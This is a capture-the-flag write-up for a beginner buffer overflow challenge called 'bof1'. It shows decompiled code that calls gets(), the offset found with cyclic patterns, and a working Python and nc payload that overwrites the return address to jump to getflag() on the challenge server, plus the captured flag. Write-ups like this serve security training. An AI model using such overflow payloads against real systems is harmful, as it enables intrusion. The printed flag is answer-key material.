# bof1
Pwn

## Challenge 

Simple bof. Get used to pwning and the toolset. Know the basics of how a program works, and how to exploit

	nc challs.hats.sg 1301

Reading:

	https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
	https://www.exploit-db.com/docs/english/28475-linux-stack-based-buffer-overflows.pdf
	https://www.youtube.com/watch?v=fTGTnrgjuGA&t=2s (Ghidra Tutorial)
	https://www.youtube.com/watch?v=KWG7prhH-ks (pwning with gef, but also shows gdb basics for exploiting)

Tools:

	Ghidra (decompilation) / r2 (disassembly/debugger)
	GDB + GEF (debugger)

Author: @dickheadedzed

## Hint
Perhaps you actually managed to jump to getflag(), but the exploit still doesn't work? jump to getflag()+1. The reason why is explained in the binary itself.

## Solution

Decompile in Hopper

	int main() {
	    banner();
	    gets(&var_20);
	    printf("bof me daddy!  %s", &var_20);
	    return 0x0;
	}

	int getflag() {
	    rax = puts("\nHINT: you shoudn't jump straight to getflag");
	    rax = puts("but instead somewhere in the middle\n");
	    rax = puts("This is due to the stack alignment shifting (the value of rbp now has a '8' in the units place, which system() does not like)");
	    rax = 0x0;
	    rax = system("cat flag");
	    rsp = rsp + 0x8;
	    rbp = stack[2047];
	    return rax;
	}

Fuzz offset

	# pwn cyclic 46 | strace ./bof1
	--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x616c6161616b} ---
	+++ killed by SIGSEGV +++
	Segmentation fault

	# pwn cyclic -l 0x616c6161616b
	[CRITICAL] Subpattern must be 4 bytes

	# pwn cyclic -l 0x6161616b
	40

Find address of getflag()

	(gdb) br getflag
	Breakpoint 1 at 0x4011f9

Payload
	
	$ # (python -c 'from pwn import *; print "A"*40 + p64(0x4011f9)') | nc challs.hats.sg 1301
	*** WELCOME TO bof1.c ***
	bof me daddy!  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@
	HINT: you shoudn't jump straight to getflag
	but instead somewhere in the middle

	This is due to the stack alignment shifting (the value of rbp now has a '8' in the units place, which system() does not like)
	HATS{boffing_my_way_thru_l1fe}

## Flag

	HATS{boffing_my_way_thru_l1fe}
